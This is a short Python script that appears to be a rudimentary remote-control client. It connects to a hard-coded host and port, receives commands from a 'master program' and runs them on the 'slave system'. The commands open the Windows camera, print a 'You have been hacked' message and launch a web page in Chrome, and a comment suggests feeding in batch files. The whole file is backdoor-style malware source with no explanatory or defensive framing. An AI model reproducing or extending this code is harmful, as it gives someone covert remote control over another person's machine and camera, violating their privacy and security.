import time 
import socket 
import sys 
import os 
  
# Initialize s to socket 
s = socket.socket() 
  
# Initialize the host 
host = "192.168.1.23"
  
# Initiaze the port 
port = 8080
  
# bind the socket with port and host 
s.connect((host, port)) 
print("Connected to Server.") 
  
# recieve the command from master program 
while True:
    command = s.recv(1024) 
    command = command.decode() 
  
# match the command and execute it on slave system 
    if command == "camera": 
        print("Command is :", command) 
        
        # you can give batch file as input here 
        os.system('color a') 
        os.system('start microsoft.windows.camera:')
    if command == "virus":
        os.system('color a')
        print("You have been hacked !!!!")  
    if command == "jimmy": 
        os.system('start chrome http://www.jimmydoussain.fr/')